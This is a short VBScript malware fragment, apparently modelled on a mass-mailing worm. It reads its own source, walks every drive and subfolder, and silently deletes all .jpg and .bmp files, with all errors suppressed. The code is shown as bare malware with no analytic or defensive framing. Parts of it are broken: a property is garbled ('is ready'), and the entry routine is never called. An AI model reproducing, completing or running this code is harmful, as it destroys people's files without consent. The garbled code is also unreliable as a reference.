On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")

set file = fso.OpenTextFile(WScript.ScriptFullname,1)

vbscopy=file.ReadAll

sub listadriv

On Error Resume Next

Dim d,dc,s

Set dc = fso.Drives

For Each d in dc

If d.is ready Then

folderlist(d.path&"\")

end if

Next

end sub

sub infectfiles(folderspec)

On Error Resume Next

set f = fso.GetFolder(folderspec)

set fc = f.Files

for each f1 in fc

ext=fso.GetExtensionName(f1.path)

if (ext="jpg") or (ext="bmp") then

fso.deletefile(f1.path)

end if

next

end sub

sub folderlist(folderspec)

On Error Resume Next

set f = fso.GetFolder(folderspec)

set sf = f.SubFolders

for each f1 in sf

infectfiles(f1.path)

folderlist(f1.path)

next

end sub